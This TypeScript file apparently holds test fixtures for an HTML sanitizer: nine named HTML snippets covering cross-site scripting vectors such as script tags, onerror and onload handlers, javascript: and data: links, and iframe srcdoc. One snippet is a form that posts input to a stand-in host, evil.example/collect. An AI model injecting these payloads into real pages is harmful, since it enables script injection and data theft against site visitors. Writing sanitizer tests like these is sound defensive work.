export type XssFixture = {
  name: string;
  html: string;
};

export const xssFixtures: XssFixture[] = [
  {
    name: "script element",
    html: "<p>Hello</p><script>alert('xss')</script>",
  },
  {
    name: "event handler attribute",
    html: '<img src="https://tracker.example/pixel.png" onerror="alert(1)" alt="pixel">',
  },
  {
    name: "javascript link",
    html: '<a href="javascript:alert(1)">Open invoice</a>',
  },
  {
    name: "data URL link",
    html: '<a href="data:text/html,<script>alert(1)</script>">Report</a>',
  },
  {
    name: "svg onload",
    html: '<svg onload="alert(1)"><circle /></svg><p>Fallback</p>',
  },
  {
    name: "iframe srcdoc",
    html: '<iframe srcdoc="<script>alert(1)</script>"></iframe><p>Frame text</p>',
  },
  {
    name: "remote background",
    html: '<table background="https://tracker.example/bg.png"><tr><td>Hi</td></tr></table>',
  },
  {
    name: "inline style execution",
    html: '<p style="background-image:url(javascript:alert(1))">Styled</p>',
  },
  {
    name: "form action",
    html: '<form action="https://evil.example/collect"><input name="q"></form><p>Form</p>',
  },
];
